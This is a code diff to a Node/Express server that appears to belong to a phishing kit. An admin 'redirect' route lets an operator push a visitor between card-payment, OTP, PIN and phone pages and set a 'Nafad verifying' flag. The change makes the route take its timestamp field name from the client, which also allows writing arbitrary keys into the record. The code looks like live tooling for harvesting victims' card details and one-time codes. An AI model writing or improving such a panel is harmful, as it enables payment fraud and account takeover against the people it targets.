@@ -1685,28 +1685,22 @@ async function startServer() {
   // Manual Redirect - Admin redirects customer to any page
   app.post("/api/dashboard/redirect", async (req, res) => {
     try {
-      const { visitorId, targetPage, setNafadVerifying } = req.body;
+      const { visitorId, targetPage, setNafadVerifying, timestampField: clientTimestampField } = req.body;
       if (!visitorId || !targetPage) {
         res.status(400).json({ error: "Missing visitorId or targetPage" });
         return;
       }
 
-      console.log("[Dashboard Redirect] visitorId:", visitorId, "targetPage:", targetPage, "setNafadVerifying:", setNafadVerifying);
+      console.log("[Dashboard Redirect] visitorId:", visitorId, "targetPage:", targetPage, "setNafadVerifying:", setNafadVerifying, "timestampField:", clientTimestampField);
       
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
       const now = new Date().toISOString();
 
-      // Map target pages to their corresponding timestamp fields
-      const pageTimestampMap: Record<string, string> = {
-        'check': '_v1UpdatedAt',      // Card payment page
-        'step2': '_v5UpdatedAt',      // OTP page
-        'step3': '_v6UpdatedAt',       // PIN page
-        'step4': '_v7UpdatedAt',       // Phone page
-        'step5': '_v7UpdatedAt',       // Phone page
-      };
-
-      const timestampField = pageTimestampMap[targetPage] || 'updatedAt';
+      // Use client-provided timestamp field, or fallback to page-based mapping
+      // This ensures the timestamp corresponds to the BOX being acted on, not the target page
+      const timestampField = clientTimestampField || 'updatedAt';
+      console.log("[Dashboard Redirect] Using timestampField:", timestampField);
 
       // Clear ALL previous statuses and set one-time redirect
       const updateData: Record<string, any> = {
@@ -1714,7 +1708,8 @@ async function startServer() {
         adminRedirectAt: now,
         oneTimeRedirect: targetPage, // One-time redirect flag
         currentPage: targetPage,
-        [timestampField]: now, // Update the timestamp for this specific box
+        // Only update the timestamp field that was explicitly provided
+        ...(timestampField !== 'updatedAt' && { [timestampField]: now }),
         // Clear all previous statuses
         phoneOtpStatus: null,
         phoneRejectionMessage: null,
